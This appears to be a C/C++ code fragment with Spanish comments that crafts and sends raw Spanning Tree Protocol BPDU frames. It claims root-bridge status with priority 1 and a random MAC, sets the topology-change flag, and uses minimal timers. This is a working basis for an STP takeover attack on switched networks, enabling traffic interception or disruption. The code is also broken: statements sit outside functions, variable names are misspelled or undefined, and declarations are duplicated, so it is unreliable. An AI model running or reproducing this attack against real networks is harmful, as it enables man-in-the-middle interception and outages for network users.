struct ether_header
{
	u8  	dhost[6]; 
	
	
	u8  	shost[6]; // = 0x0000 
	u16 	size;     // = 52  
} __attribute__ ((packed));

struct llc_header {
	u8 dsap; 	// = 0x42 
	u8 ssap; 	// = 0x42 
	u8 func; 	// = 0x03 
} __attribute__ ((packed));

struct stp_header {
	struct 	llc_header llc;
	u16 	type; 	// = 0x0000 
	u8	version; 	// = 0x00  
	u8	config; 	// = 0x00  
	u8	flags; 		// = 0x00  
	
	union {
		u8    root_id[8];	
		struct {
			u16	root_priority; 
			u8    	root_hdwaddr[6]; 	
		} root_data;
	};
	u32	root_path_cost; 	// = 0x00  
	
	union {
		u8    bridge_id[8];	
		struct {
			u16	bridge_priority; 		
			u8    bridge_hdwaddr[6];
		} bridge_data;
	};
	
	u16 	port_id; 		
	u16 	message_age; 
	u16 	max_age; 		
	u16 	hello_time; 	
	u16 	forward_delay; 	
} __attribute__ ((packed));

typedef struct {
	struct ether_header eth;
	struct stp_header stp;
} eth_stp;

int fd;
if ((fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
	perror("socket:");
		return 0;
}

char *interface_name = "eth0";
sockaddr_ll sock;
ifreq ifr;

int tmpfd = socket (AF_INET, SOCK_DGRAM, 0);
strncpy (ifr.ifr_name, interface_name, strlen(interface_name));

// recupero el index de la interfaz
ioctl (tmpfd, SIOCGIFINDEX, &ifr); 

// establezco como un sock struct
sock.sll_ifindex = ifr.ifr_ifindex;       

// address de la interfaz y lo copio en memoria de ifr
ioctl (tmpfd, SIOCGIFHWADDR, &ifr);   
memcpy (sock.sll_addr, ifr.ifr_hwaddr.sa_data, 6); 

close (tmpfd);

// Establecer los 2 primeros bytes como ID bridge y los ultimos 6 bytes como la MAC
char shwaddr[8];
shwaddr[0] = 0x00;
shwaddr[1] = 0x01;


memcpy(shwaddr + 2, ifr.ifr_hwaddr.sa_data, 6);


void make_rand_hwaddr(char *buf)
{
	for (int i(0); i < 6; ++i)
		buf[i] = rand() % 256;
}
// random de la MAC address pero con el priority ID en 1
make_rand_hwaddr(shwaddr + 2);

u16 atohex (u8 *hex)
{
	short int x,y,a,a2=0;
	char buf[2];

	char nums[] = {"0123456789abcdef"};

	memcpy(buf, hex, 2);	
	for (int x(0); x < 2; ++x) {
		for (int y(0); y < 16; ++y) {
			if (buf[x] == nums[y]) {
				if (x == 0) 
					a = (y) * 16;   
				else 
					a = y;
				a2 +=a;
	   		}
	    }
	}
	return a2;
}

u8 *ascii_to_hwaddr (const char *hwaddr)
{
	u8 t[2];
	u8 y(0);
	static u8 buf[6];
	do {     
	    t[0] = *hwaddr++;	
	    t[1] = *hwaddr++;
	    hwaddr++;
	    buf[y] = atohex (t);
	    y++;
	} while (y < 6);
	
	return (buf);
}

const char *fill_stp_header(char *shwaddr, bool topology_change,
	char *root_id, u32 forward_delay, u32 max_age, u32 hello_time, 
	u32 port_id)
{
	static eth_stp stp_packet;
	memset(&stp_packet, 0, sizeof(stp_packet));
    
    // (STP multicast: 01-80-C2-00-00-00)
	memcpy(stp_packet.eth.dhost, 
		ascii_to_hwaddr("01-80-c2-00-00-00"), 6);
	memcpy (stp_packet.eth.shost, shwaddr, 6);  
	memcpy(stp_packet.stp.root_id, root_id, 8);
	memcpy(stp_packet.stp.bridge_id, root_id, 8);

    // size 52
    stp_packet.eth.size = htons(0x0034);
	stp_packet.stp.llc.dsap = 0x42;
	stp_packet.stp.llc.ssap = 0x42;
	stp_packet.stp.llc.func = 0x03;
	stp_packet.stp.port_id = port_id;
	stp_packet.stp.hello_time = hello_time;
	stp_packet.stp.max_age = max_age;
	stp_packet.stp.forward_delay = forward_delay;

	if (topology_change)
		stp_packet.stp.flags = 0x01;
	
	return (const char*) &stp_packet;
}

// shwaddrr + 2: Le paso la MAC Address
// topology_change : si es verdadero hara que otros switch reanuncien el cambio de root bridge
// shwaddr : le pasamos nuestro root bridge
// foward_delay : el tiempo que los modos listen y learning antes de ir al modo learning y forwarding
// max age : numero de segundos que los switch deben esperar al protocolo STP, luego de ese tiempo dan como caido al root bridge y empieza de nuevo el proceso de eleccion
// port id : el id del puerto en el puerto emisor

u32 port_id = 0x8002;
u32 hello_time = 0x0001;
u32 max_age = 0x0001;
u32 foward_delay = 0x0001;

const char *buf = fill_stp_header(shwaddr + 2, topology_change, 
	shwaddr, forward_delay, max_age, hello_name, port_id);

int fd;
if ((fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
	perror("socket:");
	return 0;
}
			
if ((sendto (fd, buf, sizeof(eth_stp), 0, (struct sockaddr*)&sock, 
	sizeof(sockaddr_ll))) == -1) {
	perror("sendto:");
	return 0;
}
